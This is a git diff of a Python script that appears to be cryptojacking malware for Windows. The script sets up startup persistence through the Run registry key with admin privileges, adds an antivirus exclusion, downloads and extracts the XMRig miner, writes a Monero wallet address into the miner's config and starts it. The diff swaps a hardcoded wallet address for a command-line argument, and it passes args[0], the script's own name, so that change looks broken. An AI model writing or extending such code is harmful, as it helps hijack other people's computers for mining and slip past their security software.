@@ -5,11 +5,13 @@ import sys
 import subprocess
 import json
 
+args = sys.argv
+
 xmrig_download_path = os.path.expanduser('~\\AppData\\Local')
 xmrig_version_name = os.listdir(os.path.join(xmrig_download_path, "/xmrig/"))
 
 def get_persistance_and_priv():
-    #! Startup + admin priv for windows systems
+    # Startup + admin priv for windows systems
         
         #? Set up keys and paths
         key = r"Software\Microsoft\Windows\CurrentVersion\Run"
@@ -64,7 +66,7 @@ def get_xmrig():
     subprocess.run(f"tar -xf {xmrig_download_path}/xmrig.zip") # Extract binary
 
 
-def edit_xmrig_config():
+def edit_xmrig_config(xmr_adress:str):
     # Get the file path, and take the [0] index of the xmrig_version_name since it would be equal to the only available file in the dir
     xmrig_config = os.path.join(xmrig_download_path, f"/xmrig/{xmrig_version_name[0]}/config.json")
 
@@ -73,7 +75,7 @@ def edit_xmrig_config():
         data = json.load(config_file)
         new_pools_value = {
             "url": None,
-            "user": "82XPEyXycqBCi4pK5RfaThDeECNzXJGRMXMr5LzSgnxUVfB2Y3GRqm51CGAuoM252tdYRonMibMyyc8LvFUNsEmE8k5zwFS",
+            "user": xmr_adress,
             "pass": "x",
             "rig-id": "optional_rig_identifier",
             "enabled": True
@@ -100,7 +102,7 @@ def main():
     get_persistance_and_priv()
     get_av_exclusion()
     get_xmrig()
-    edit_xmrig_config()
+    edit_xmrig_config(args[0])
     run_xmrig()
 
 if __name__ == "__main__":
